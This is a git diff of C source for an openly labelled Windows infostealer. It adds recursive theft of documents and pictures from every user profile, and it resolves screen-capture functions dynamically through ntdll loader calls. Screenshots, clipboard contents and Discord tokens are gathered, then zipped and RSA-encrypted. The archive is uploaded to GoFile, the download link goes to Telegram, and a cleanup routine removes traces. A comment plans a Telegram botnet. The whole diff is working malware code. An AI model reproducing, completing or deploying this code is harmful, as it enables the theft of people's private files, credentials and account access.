@@ -4,10 +4,12 @@
 #include <windows.h>
 #include <dirent.h>
 #include <fcntl.h>
+#include <time.h>
 #include "./../../include/global.h"
 #include "./../../include/crypto.h"
 #include "./../../include/browsers.h"
 #include "./../../include/extra.h"
+#include "./../../include/network.h"
 
 // Function pointers for dynamically loading and managing DLLs and procedures
 NtLdrLoadDll LoadLib = NULL;
@@ -31,7 +33,7 @@ BCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider = NULL;
 
 // Function to retrieve function pointers for NT API functions from ntdll.dll
 int GetHandleNTAPI(NtLdrLoadDll *LoadLib, NtLdrGetProcedureAddress *GetProcAdd, NtLdrUnloadDll *UnloadLib) {
-    // I used this website so much for the NtAPI stuff: https://ntdoc.m417z.com/ ;)
+    // I used this website so much for the NtAPI stuff here and in the past: https://ntdoc.m417z.com/ ;)
 
     // Load the ntdll.dll module
     HMODULE hModule = GetModuleHandleW(L"ntdll.dll");
@@ -77,100 +79,124 @@ int FindImportantFiles(char *basePath, const char *tempPath) {
     char path[1000];
     struct dirent *dp;
     DIR *dir = opendir(basePath);
-    
+
     // Check if the directory could be opened
-    if (!dir)
-    {
-        // Return an error if directory can't be opened
+    if (!dir) {
+        printf("ERROR: Could not open directory: %s\n", basePath);
         return 1;
     }
-    
+    printf("DEBUG: Opened directory: %s\n", basePath);
+
     // Read each entry in the directory
-    while ((dp = readdir(dir)) != NULL)
-    {
+    while ((dp = readdir(dir)) != NULL) {
         // Skip the special entries "." and ".."
-        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
-        {
+        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
             // Construct the full path for the current directory entry
             strcpy(path, basePath);
             strcat(path, "\\");
             strcat(path, dp->d_name);
-            
-            // Check if the file has an important extension
-            if (strstr(path, ".jpg") != NULL || strstr(path, ".txtfc") != NULL || strstr(path, ".docx") != NULL ||
-                strstr(path, ".pdf") != NULL || strstr(path, ".xsls") != NULL || strstr(path, ".csv") != NULL ||
-                strstr(path, ".sql") != NULL)
-            {
-                // Construct the path where the file will be saved
-                char outputdir[MAX_PATH];
-                sprintf(outputdir, "%s\\StolenFiles\\%s", tempPath, dp->d_name);
-                
-                unsigned char buffer[8192];
-                int err, n;
-                
-                // Open the source file for reading
-                int src_fd = open(path, O_RDONLY);
-                // Open the destination file for writing (create if not exists)
-                int dst_fd = open(outputdir, O_CREAT | O_WRONLY);
-                
-                // Copy data from the source file to the destination file
-                while (1)
-                {
-                    err = read(src_fd, buffer, 8192);
-                    if (err == -1)
-                    {
-                        // Continue if read fails
+            printf("DEBUG: Found entry: %s\n", path);
+
+            // Check if the current path is a directory or a file
+            DWORD dwAttributes = GetFileAttributes(path);
+            if (dwAttributes == INVALID_FILE_ATTRIBUTES) {
+                printf("ERROR: Could not get file attributes for: %s\n", path);
+                continue;
+            }
+
+            if (dwAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                // It's a directory, so recurse into it
+                printf("DEBUG: Recursing into subdirectory (if applicable): %s\n", path);
+                FindImportantFiles(path, tempPath);
+            } else {
+                // It's a file, check if it has an important extension
+                if (strstr(path, ".jpg") != NULL || strstr(path, ".txtfc") != NULL || strstr(path, ".docx") != NULL ||
+                    strstr(path, ".pdf") != NULL || strstr(path, ".xsls") != NULL || strstr(path, ".csv") != NULL ||
+                    strstr(path, ".sql") != NULL) {
+                    // Construct the path where the file will be saved
+                    char outputdir[MAX_PATH];
+                    sprintf(outputdir, "%s\\StolenFiles\\%s", tempPath, dp->d_name);
+                    printf("DEBUG: Identified important file: %s\n", path);
+                    printf("DEBUG: Output directory for the file: %s\n", outputdir);
+
+                    unsigned char buffer[8192];
+                    int err, n;
+
+                    // Open the source file for reading
+                    int src_fd = open(path, O_RDONLY);
+                    if (src_fd == -1) {
+                        printf("ERROR: Could not open source file: %s\n", path);
                         continue;
                     }
-                    n = err;
-                    if (n == 0)
-                        break; // End of file
-                    err = write(dst_fd, buffer, n);
-                    if (err == -1)
-                    {
-                        // Continue if write fails
+
+                    // Open the destination file for writing (create if not exists)
+                    int dst_fd = open(outputdir, O_CREAT | O_WRONLY);
+                    if (dst_fd == -1) {
+                        printf("ERROR: Could not create/open destination file: %s\n", outputdir);
+                        close(src_fd);
                         continue;
                     }
+
+                    // Copy data from the source file to the destination file
+                    while (1) {
+                        err = read(src_fd, buffer, 8192);
+                        if (err == -1) {
+                            printf("ERROR: Failed to read from file: %s\n", path);
+                            break; // Stop reading on error
+                        }
+                        n = err;
+                        if (n == 0)
+                            break; // End of file
+                        err = write(dst_fd, buffer, n);
+                        if (err == -1) {
+                            printf("ERROR: Failed to write to file: %s\n", outputdir);
+                            break; // Stop writing on error
+                        }
+                    }
+
+                    // Close the file descriptors
+                    close(src_fd);
+                    close(dst_fd);
+                    printf("DEBUG: Completed copying file: %s to %s\n", path, outputdir);
                 }
-                // Close the file descriptors
-                close(src_fd);
-                close(dst_fd);
             }
         }
-        
-        // Recursively search for important files in subdirectories
-        FindImportantFiles(path, tempPath);
     }
-    
+
     // Close the directory
     closedir(dir);
-    
+    printf("DEBUG: Closed directory: %s\n", basePath);
+
     return 0; // Return success
 }
 int StealDocuments(const char *folder) {
     // Log message indicating the start of the file search process
-    OKAY("Looking for important files");
+    printf("DEBUG: Starting to look for important files in folder: %s\n", folder);
     
     // Create a directory to store the stolen files
     char StolenDirectory[MAX_PATH];
     sprintf(StolenDirectory, "%s\\StolenFiles", folder);
+    printf("DEBUG: Creating directory for stolen files: %s\n", StolenDirectory);
     mkdir(StolenDirectory);
     
     char *arr[4096] = {0}; // Array to store paths to be searched
     int pathCount = 0; // Counter for the number of paths
+    printf("DEBUG: Initialized array for storing paths with pathCount: %d\n", pathCount);
     
     WIN32_FIND_DATA fdFile;
     HANDLE hFind = NULL;
     char sPath[MAX_PATH] = "C:\\Users\\*";
     
     // Find all directories under C:\\Users\\
+    printf("DEBUG: Searching directories in path: %s\n", sPath);
     hFind = FindFirstFile(sPath, &fdFile);
     if (hFind == INVALID_HANDLE_VALUE)
     {
+        printf("ERROR: Failed to find first file in path: %s\n", sPath);
         // Return error if FindFirstFile fails
         return -1;
     }
-
+    
     // Loop through all the found entries
     do
     {
@@ -180,44 +206,47 @@ int StealDocuments(const char *folder) {
             // Construct the full path to the user directory
             char fullPath[MAX_PATH];
             snprintf(fullPath, sizeof(fullPath), "C:\\Users\\%s", fdFile.cFileName);
+            printf("DEBUG: Found directory: %s\n", fullPath);
             
             // Check if the path is a directory
             DWORD dwRes = GetFileAttributes(fullPath);
             if (dwRes != INVALID_FILE_ATTRIBUTES && (dwRes & FILE_ATTRIBUTE_DIRECTORY))
             {
+                printf("DEBUG: Directory exists: %s\n", fullPath);
+                
                 // Open the directory to access its contents
-                HANDLE hDir = CreateFile(fullPath, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-                                         NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+                HANDLE hDir = CreateFile(fullPath, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
                 if (hDir != INVALID_HANDLE_VALUE)
                 {
-                    char *DocumentsPath = (char *)malloc(MAX_PATH);
-                    char *PicturesPath = (char *)malloc(MAX_PATH);
+                    char *DocumentsPath = (char *)malloc(260);
+                    char *PicturesPath = (char *)malloc(260);
                     
                     // Check for memory allocation failure
                     if (!DocumentsPath || !PicturesPath)
                     {
+                        printf("ERROR: Failed to allocate memory for Documents or Pictures path\n");
+                        
                         // Free previously allocated paths and return error
-                        for (int i = 0; i < pathCount; ++i)
-                        {
-                            free(arr[i]);
-                        }
+                        for (int i = 0; i < pathCount; ++i) { free(arr[i]); }
                         return -1;
                     }
                     
                     // Construct paths for Documents and Pictures directories
-                    snprintf(DocumentsPath, MAX_PATH, "%s\\Documents", fullPath);
-                    snprintf(PicturesPath, MAX_PATH, "%s\\Pictures", fullPath);
+                    snprintf(DocumentsPath, 260, "%s\\Documents", fullPath);
+                    snprintf(PicturesPath, 260, "%s\\Pictures", fullPath);
+                    printf("DEBUG: Constructed paths: Documents=%s, Pictures=%s\n", DocumentsPath, PicturesPath);
                     
                     // Store the paths in the array
                     if (pathCount < 4096)
                     {
                         arr[pathCount++] = DocumentsPath;
                         arr[pathCount++] = PicturesPath;
+                        printf("DEBUG: Paths added to array. Total paths: %d\n", pathCount);
                     }
                     else
                     {
                         // Log message if path list is full and free allocated memory
-                        printf("Path list is full\n");
+                        printf("ERROR: Path list is full, freeing memory and returning error\n");
                         free(DocumentsPath);
                         free(PicturesPath);
                         for (int i = 0; i < pathCount; ++i)
@@ -229,57 +258,153 @@ int StealDocuments(const char *folder) {
 
                     // Close the directory handle
                     CloseHandle(hDir);
+                    printf("DEBUG: Closed directory handle for: %s\n", fullPath);
                 }
+                else
+                {
+                    printf("ERROR: Failed to open directory: %s\n", fullPath);
+                }
+            }
+            else
+            {
+                printf("DEBUG: Skipped, not a directory: %s\n", fullPath);
             }
         }
     } while (FindNextFile(hFind, &fdFile) != 0); // Continue to the next file or directory
     
     // Close the find handle
     FindClose(hFind);
+    printf("DEBUG: Completed searching user directories\n");
     
     // Process each path collected
     for (int i = 0; i < pathCount; ++i)
     {
+        printf("DEBUG: Processing path: %s\n", arr[i]);
         // Search for important files in each Documents and Pictures directory
         FindImportantFiles(arr[i], folder);
         free(arr[i]); // Free the allocated path memory
+        printf("DEBUG: Freed memory for path: %s\n", arr[i]);
     }
-
+    
+    printf("DEBUG: Finished processing all paths\n");
     return 0; // Return success
 }
+
 int Screenshot(const char *folder) {
+    INFO("Trying to get screenshot...");
+
     // Declare a UNICODE_STRING to store the DLL name for dynamic loading of gdi32.dll
     UNICODE_STRING dllName;
     WCHAR dllNameBuffer[] = L"gdi32.dll";
     dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
     dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
     dllName.Buffer = dllNameBuffer;
-    
     ULONG dllCharacteristics = 0;
     PVOID hGdi32 = NULL;
     
     // Dynamically load the GDI32.dll library using LoadLib
     NTSTATUS status = LoadLib(NULL, &dllCharacteristics, &dllName, &hGdi32);
-    if (!NT_SUCCESS(status)) { return 1; }
-    
+    if (!NT_SUCCESS(status)) { WARN("Error loading gdi32.dll..."); return 1; }
+    INFO("Loaded gdi32.dll");
+
     // Get function pointers for the required GDI32 functions
-    pfnCreateCompatibleDC = (PFNCreateCompatibleDC)GetProcAddress(hGdi32, "CreateCompatibleDC");
-    pfnCreateCompatibleBitmap = (PFNCreateCompatibleBitmap)GetProcAddress(hGdi32, "CreateCompatibleBitmap");
-    pfnGetDeviceCaps = (PFNGetDeviceCaps)GetProcAddress(hGdi32, "GetDeviceCaps");
-    pfnBitBlt = (PFNBitBlt)GetProcAddress(hGdi32, "BitBlt");
-    pfnSelectObject = (PFNSelectObject)GetProcAddress(hGdi32, "SelectObject");
-    pfnDeleteDC = (PFNDeleteDC)GetProcAddress(hGdi32, "DeleteDC");
-    pfnDeleteObject = (PFNDeleteObject)GetProcAddress(hGdi32, "DeleteObject");
-    pfnGetObjectA = (PFNGetObjectA)GetProcAddress(hGdi32, "GetObjectA");
-    pfnGetDIBits = (PFNGetDIBits)GetProcAddress(hGdi32, "GetDIBits");
+    ANSI_STRING procName1;
+    CHAR procNameBuffer1[] = "CreateCompatibleDC";
+    procName1.Length = (USHORT)strlen(procNameBuffer1);
+    procName1.MaximumLength = procName1.Length + 1;
+    procName1.Buffer = procNameBuffer1;
+    PVOID CreateCompatibleDCProcAddress = NULL;
+    NTSTATUS STATUS1 = GetProcAdd(hGdi32, &procName1, 0, &CreateCompatibleDCProcAddress);
+    if (!NT_SUCCESS(STATUS1) || CreateCompatibleDCProcAddress == NULL) { WARN("Error getting pointer to address of CreateCompatibleDC()"); UnloadLib(hGdi32); return -3; }
+    PFNCreateCompatibleDC pfnCreateCompatibleDC = (PFNCreateCompatibleDC)CreateCompatibleDCProcAddress;
+
+    ANSI_STRING procName2;
+    CHAR procNameBuffer2[] = "CreateCompatibleBitmap";
+    procName2.Length = (USHORT)strlen(procNameBuffer2);
+    procName2.MaximumLength = procName2.Length + 1;
+    procName2.Buffer = procNameBuffer2;
+    PVOID CreateCompatibleBitmapProcAddress = NULL;
+    NTSTATUS STATUS2 = GetProcAdd(hGdi32, &procName2, 0, &CreateCompatibleBitmapProcAddress);
+    if (!NT_SUCCESS(STATUS2) || CreateCompatibleBitmapProcAddress == NULL) { WARN("Error getting pointer to address of CreateCompatibleBitmap()"); UnloadLib(hGdi32); return -3; }
+    PFNCreateCompatibleBitmap pfnCreateCompatibleBitmap = (PFNCreateCompatibleBitmap)CreateCompatibleBitmapProcAddress;
+
+    ANSI_STRING procName3;
+    CHAR procNameBuffer3[] = "GetDeviceCaps";
+    procName3.Length = (USHORT)strlen(procNameBuffer3);
+    procName3.MaximumLength = procName3.Length + 1;
+    procName3.Buffer = procNameBuffer3;
+    PVOID GetDeviceCapsProcAddress = NULL;
+    NTSTATUS STATUS3 = GetProcAdd(hGdi32, &procName3, 0, &GetDeviceCapsProcAddress);
+    if (!NT_SUCCESS(STATUS3) || GetDeviceCapsProcAddress == NULL) { WARN("Error getting pointer to address of GetDeviceCaps()"); UnloadLib(hGdi32); return -3; }
+    PFNGetDeviceCaps pfnGetDeviceCaps = (PFNGetDeviceCaps)GetDeviceCapsProcAddress;
+
+    ANSI_STRING procName4;
+    CHAR procNameBuffer4[] = "BitBlt";
+    procName4.Length = (USHORT)strlen(procNameBuffer4);
+    procName4.MaximumLength = procName4.Length + 1;
+    procName4.Buffer = procNameBuffer4;
+    PVOID BitBltProcAddress = NULL;
+    NTSTATUS STATUS4 = GetProcAdd(hGdi32, &procName4, 0, &BitBltProcAddress);
+    if (!NT_SUCCESS(STATUS4) || BitBltProcAddress == NULL) { WARN("Error getting pointer to address of BitBlt()"); UnloadLib(hGdi32); return -3; }
+    PFNBitBlt pfnBitBlt = (PFNBitBlt)BitBltProcAddress;
+
+    ANSI_STRING procName5;
+    CHAR procNameBuffer5[] = "SelectObject";
+    procName5.Length = (USHORT)strlen(procNameBuffer5);
+    procName5.MaximumLength = procName5.Length + 1;
+    procName5.Buffer = procNameBuffer5;
+    PVOID SelectObjectProcAddress = NULL;
+    NTSTATUS STATUS5 = GetProcAdd(hGdi32, &procName5, 0, &SelectObjectProcAddress);
+    if (!NT_SUCCESS(STATUS5) || SelectObjectProcAddress == NULL) { WARN("Error getting pointer to address of SelectObject()"); UnloadLib(hGdi32); return -3; }
+    PFNSelectObject pfnSelectObject = (PFNSelectObject)SelectObjectProcAddress;
+
+    ANSI_STRING procName6;
+    CHAR procNameBuffer6[] = "DeleteDC";
+    procName6.Length = (USHORT)strlen(procNameBuffer6);
+    procName6.MaximumLength = procName6.Length + 1;
+    procName6.Buffer = procNameBuffer6;
+    PVOID DeleteDCProcAddress = NULL;
+    NTSTATUS STATUS6 = GetProcAdd(hGdi32, &procName6, 0, &DeleteDCProcAddress);
+    if (!NT_SUCCESS(STATUS6) || DeleteDCProcAddress == NULL) { WARN("Error getting pointer to address of DeleteDC()"); UnloadLib(hGdi32); return -3; }
+    PFNDeleteDC pfnDeleteDC = (PFNDeleteDC)DeleteDCProcAddress;
+
+    ANSI_STRING procName7;
+    CHAR procNameBuffer7[] = "DeleteObject";
+    procName7.Length = (USHORT)strlen(procNameBuffer7);
+    procName7.MaximumLength = procName7.Length + 1;
+    procName7.Buffer = procNameBuffer7;
+    PVOID DeleteObjectProcAddress = NULL;
+    NTSTATUS STATUS7 = GetProcAdd(hGdi32, &procName7, 0, &DeleteObjectProcAddress);
+    if (!NT_SUCCESS(STATUS7) || DeleteObjectProcAddress == NULL) { WARN("Error getting pointer to address of DeleteObject()"); UnloadLib(hGdi32); return -3; }
+    PFNDeleteObject pfnDeleteObject = (PFNDeleteObject)DeleteObjectProcAddress;
+
+    ANSI_STRING procName8;
+    CHAR procNameBuffer8[] = "GetObjectA";
+    procName8.Length = (USHORT)strlen(procNameBuffer8);
+    procName8.MaximumLength = procName8.Length + 1;
+    procName8.Buffer = procNameBuffer8;
+    PVOID PFNGetObjectAProcAddress = NULL;
+    NTSTATUS STATUS8 = GetProcAdd(hGdi32, &procName8, 0, &PFNGetObjectAProcAddress);
+    if (!NT_SUCCESS(STATUS8) || PFNGetObjectAProcAddress == NULL) { WARN("Error getting pointer to address of PFNGetObjectA()"); UnloadLib(hGdi32); return -3; }
+    PFNGetObjectA pfnGetObjectA = (PFNGetObjectA)PFNGetObjectAProcAddress;
+
+    ANSI_STRING procName9;
+    CHAR procNameBuffer9[] = "GetDIBits";
+    procName9.Length = (USHORT)strlen(procNameBuffer9);
+    procName9.MaximumLength = procName9.Length + 1;
+    procName9.Buffer = procNameBuffer9;
+    PVOID GetDIBitsProcAddress = NULL;
+    NTSTATUS STATUS9 = GetProcAdd(hGdi32, &procName1, 0, &GetDIBitsProcAddress);
+    if (!NT_SUCCESS(STATUS9) || GetDIBitsProcAddress == NULL) { WARN("Error getting pointer to address of GetDIBits()"); UnloadLib(hGdi32); return -3; }
+    PFNGetDIBits pfnGetDIBits = (PFNGetDIBits)GetDIBitsProcAddress;
     
     // If any of the function pointers could not be obtained, return an error
-    if (!pfnCreateCompatibleDC || !pfnCreateCompatibleBitmap || !pfnGetDeviceCaps || !pfnBitBlt ||
-        !pfnSelectObject || !pfnDeleteDC || !pfnDeleteObject || !pfnGetObjectA || !pfnGetDIBits)
-    {
-        return 1;
-    }
-    
+    if (!pfnCreateCompatibleDC || !pfnCreateCompatibleBitmap || !pfnGetDeviceCaps || !pfnBitBlt     ||
+        !pfnSelectObject       || !pfnDeleteDC               || !pfnDeleteObject  || !pfnGetObjectA ||
+        !pfnGetDIBits) { WARN("Error getting function addresses from gdi.dll"); return 1; }
+
+
+
     // Prepare to save the screenshot file with a timestamped filename
     char filename[MAX_PATH];
     SYSTEMTIME st;
@@ -417,7 +542,7 @@ int Screenshot(const char *folder) {
     else
     {
         // Log success message
-        OKAY("Bitmap file (aka screenshot) file, has been created successfully!\n\n");
+        OKAY("Bitmap file (aka screenshot) file, has been created successfully!\n\n\n\n\n");
     }
     
     // Close the file handle and free allocated resources
@@ -464,7 +589,7 @@ int Clipboard(const char *folder) {
         fprintf(file, "%s\n", pContent);
         
         // Log a success message (this seems like a custom function).
-        OKAY("Clipboard data has been stolen successfully! Saved to %s\n\n", output);
+        OKAY("Clipboard data has been stolen successfully! Saved to %s.\n\n\n\n\n", output);
         
         // Unlock the global memory object (release the clipboard data).
         GlobalUnlock(hData);
@@ -611,12 +736,13 @@ int AccountTokens(char *temp, char *userf) {
         Discord(FileFullPath, DiscordTokens, &DiscordTokensLength); // Extract tokens from the file.
     }
 
-    // Log a success message once all files have been processed.
-    OKAY("Successfully stole saved Discord tokens! Saved to %s\n", output);
+    // Success message.
+    printf("\n\n");
+    OKAY("Successfully stole saved Discord tokens! Saved to %s\n\n\n\n\n", output);
 
     // Print out each of the found Discord tokens.
     for (int i = 0; i < 10; i++) {
-        if (DiscordTokens[i][0] != '\0') // If the token is not empty.
+        if (DiscordTokens[i][0] != '\0')
         {
             // Write to file tokens.
             FILE *file = fopen(output, "w");
@@ -847,9 +973,9 @@ int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLen
     free(data);
     free(data2);
 
-    return 0; // Return success.
+    return 0;
 }
-int CompressAndEncryptData(char *temp, char *currentuser) {
+int CompressAndEncryptData(char *temp, char *currentuser, char *OutEncPath) {
     // Zip files.
     int index = 0;
     char Files[20][MAX_PATH] = {0};
@@ -862,32 +988,44 @@ int CompressAndEncryptData(char *temp, char *currentuser) {
     MultiByteToWideChar(CP_UTF8, 0, zipPath, -1, ZipOutput, size);
     for (int i = 0; i < index; i++) { int size = MultiByteToWideChar(CP_UTF8, 0, Files[i], -1, NULL, 0); files[i] = (WCHAR *)malloc(size * sizeof(WCHAR)); MultiByteToWideChar(CP_UTF8, 0, Files[i], -1, (LPWSTR)files[i], size); }
     CompressFile(files, index, ZipOutput);
-    for (int i = 0; i < index; i++) { free((void *)files[i]); } // Free memory.
-    free(ZipOutput);                                            // Free memory.
+    for (int i = 0; i < index; i++) { free((void *)files[i]); }
+    free(ZipOutput);
 
-    OKAY("Zipped stolen data.\n");
+    OKAY("Zipped stolen data.");
 
     // Remove old folder
     remove_directory(temp);
-    OKAY("Removed data storage folder\n");
+    INFO("Removed data storage folder.\n\n\n\n\n");
 
     // RSA encrypt the ZIP file.
     char BizPath[MAX_PATH];
-    sprintf(BizPath, "%s\\BIZ.zip", zipPath);
+    sprintf(BizPath, "%s\\BIZ.zip", zipPath);  
     char BizEncPath[MAX_PATH];
-    sprintf(BizEncPath, "%s\\FUM6204545345.enc", zipPath);
+    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQESTUVWXYZ";
+    int size2 = 16;
+    char str[40];
+    if (size2) {
+        --size2;
+        for (size_t n = 0; n < size2; n++) {
+            int key = rand() % (int) (sizeof charset - 1);
+            str[n] = charset[key];
+        }
+        str[size2] = '\0';
+    }
+    sprintf(BizEncPath, "%s\\FUM_%s.enc", zipPath, str);
+    INFO("Output location should be %s if it succeeds.", BizEncPath);
     if (RSAEncrypt(BizPath, BizEncPath) != 0) { WARN("Error in RSA encrypting the ZIP file!"); return 1; }
-    OKAY("RSA Encrypted the zip file and output it to %s !", BizEncPath);
+    OKAY("RSA Encrypted the zip file and output it to %s !\n\n\n\n\n", BizEncPath);
+    strcpy(OutEncPath, BizEncPath);
     return 0;
-
 }
 
 
-
 int main() {
+    srand(time(NULL));
     // Get function addresses of ntdll LdrLoadLib, LdrUnloadLib and LdrGetProcedureAddress, we need it for winhttp.dll and other dll loading later on.
     if (GetHandleNTAPI(&LoadLib, &GetProcAdd, &UnloadLib) != 0) { return 1; }
-    OKAY("Loaded NTAPI!\n\n");
+    OKAY("Loaded NTAPI!\n\n\n\n\n");
 
 
     // Make temp dir.
@@ -895,7 +1033,7 @@ int main() {
     char temp[256];
     snprintf(temp, sizeof(temp), "%s\\AppData\\Local\\Temp\\bizfum", currentuser);
     mkdir(temp);
-    OKAY("Temporary directory for storing gathered data is created! Location is %s.\n\n", temp);
+    OKAY("Temporary directory for storing gathered data is created! Location is %s.\n\n\n\n\n", temp);
 
 
     // Take screenshot and save it as a bitmap file to the temporary directory.
@@ -903,20 +1041,18 @@ int main() {
 
 
     // Start the stealing of documents and pictures. Check first if +5GB free space before that.
-    // Even 1GB would probably be enough, but set to 5GB just to be safe.
-    DWORD sectorsPerCluster;
-    DWORD bytesPerSector;
-    DWORD numberOfFreeClusters;
-    DWORD totalNumberOfClusters;
+    // Even 1GB would probably be enough, but set to 8GB just to be safe. ( Caused some problems on my machine... )
+    INFO("Counting available disk space...");
+    DWORD sectorsPerCluster; DWORD bytesPerSector; DWORD numberOfFreeClusters; DWORD totalNumberOfClusters;
     if (GetDiskFreeSpaceW(L"C:\\", &sectorsPerCluster, &bytesPerSector, &numberOfFreeClusters, &totalNumberOfClusters)) {
         ULONGLONG freeSpace = (ULONGLONG)numberOfFreeClusters * sectorsPerCluster * bytesPerSector;
         INFO("Free space: %d GB", freeSpace/1000000000);
         if ((freeSpace/1000000000) >= 8) {
-            INFO("Enough free space to start stealing files...\n\n\n");
+            INFO("Enough free space to start stealing files...");
             StealDocuments(temp);
         }
         else {
-            WARN("Not enough free space to steal documents and pictures.\n\n");
+            WARN("Not enough free space to steal documents and pictures.\n\n\n\n\n");
         }
     } else {
         WARN("Error getting disk space: %lu\n", GetLastError());
@@ -945,22 +1081,28 @@ int main() {
     // In progress.
 
 
-    // ZIP + AES Encrypt + RSA Encrypt the stolen data.
-    CompressAndEncryptData(temp, currentuser);
+    // Compress the folder with stolen data and encrypt using a RSA public key.
+    char OutEncPath[MAX_PATH];
+    CompressAndEncryptData(temp, currentuser, OutEncPath);
 
 
+    // Upload the stolen file to GoFile through their API.
+    INFO("Starting uploading of the encrypted file...");
+    INFO("Getting best GoFile server to upload the file to...");
+    char ServerBuf[8] = "";
+    if ( GetGoFileServer(ServerBuf) == 0 ){
+        OKAY("Using Subdomain: %s\n", ServerBuf);   
+    }
+    char Link[30];
+    if ( UploadGoFile(Link, OutEncPath, ServerBuf) == 0 ) {
+        OKAY("Uploaded File. The link is %s\n", Link);
+    }
 
+    // Send the Download Link to Telegram.
+    SendTelegram(Link);
 
-    // Load the winhttp.dll functions with NtAPI versions of LoadLibrary and GetProcAddress.
-    // In progress.
-
-
-    // Upload the stolen data to gofile or such platform.
-    // In progress.
-
-
-    // Delete the temporary directory and clean up.
-    // In progress.
+    // Do cleanup stuff. Remove files left, remove logs etc.
+    Clean(OutEncPath);
 
     // Botnet based on Telegram.
     // Not in near future. :P
